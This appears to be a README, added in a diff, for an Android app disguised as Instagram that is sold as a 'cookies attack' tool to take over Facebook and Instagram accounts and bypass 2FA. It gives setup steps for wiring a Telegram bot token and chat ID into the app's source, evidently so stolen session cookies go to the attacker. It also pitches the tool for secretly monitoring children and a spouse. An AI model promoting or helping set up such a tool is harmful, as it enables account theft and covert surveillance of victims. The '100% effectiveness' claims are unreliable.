@@ -1,0 +1,52 @@
+⭕---------- ABOUT THIS TOOL ----------⭕
+
+Cookies attack hacking tool, which allows you to hack Facebook, Instagram accounts without the victim's knowledge. It is capable of bypassing all the security of meta. It is not detected quickly like phishing and does not take much time like brute force. It is different from all other tools and the most powerful, guaranteeing 100% effectiveness. You can use it to keep an eye on your children, to monitor your wife, and to enhance your work. Moreover, it is completely free of cost.
+
+Disclaimer:- Please remember that if you misuse this tool, you alone will be responsible. We have created this tool for testing and for legitimate purposes. If you engage in any inappropriate activities on internet, you will bear the full responsibility.
+
+
+♦️---------- FEATURES ----------♦️
+
+[+] Bypass 2FA!
+[+] Run 24/7 !
+[+] No need to share any links !
+[+] No error !
+[+] Up to date all time!
+[+] Easy to setup !
+[+] Not required termux and Kali Linux !
+
+
+🧑‍💻---------- SETUP INFORMATION ----------🧑‍💻
+
+First of all you need to Extract the zip file by Z.archiver.
+
+Then you need to create a bot on telegram.
+
+After creating the bot copy the bot token.
+
+We need also chat ID to build this attack open this bot on Telegram and start the bot & copy the Chat ID
+
+Then edit the bot token & chat id by going to this location I_F 2.0 
+
+(ABHI_CYBERTERON)\instagram\app\src\main\java\com\instagram\MainActivity line 32.
+
+After this build an apk with aide studio.
+
+Then sing the apk with the apk editor.
+
+
+↪️ GITHUB REPOSITORY:- https://github.com/Cyberteron
+
+
+🌐.......... ̷S̷O̷C̷I̷A̷L̷ ̷M̷E̷D̷I̷A̷ ̷L̷I̷N̷K̷ ..........🌐
+
+
+► GITHUB ☠ :- https://github.com/Cyberteron
+
+If you have any problem with this tool then contact us ⤵️⤵️.
+
+takerpass1@gmail.com
+
+
+
+      ❤️MADE BY Abhishek M ❤️
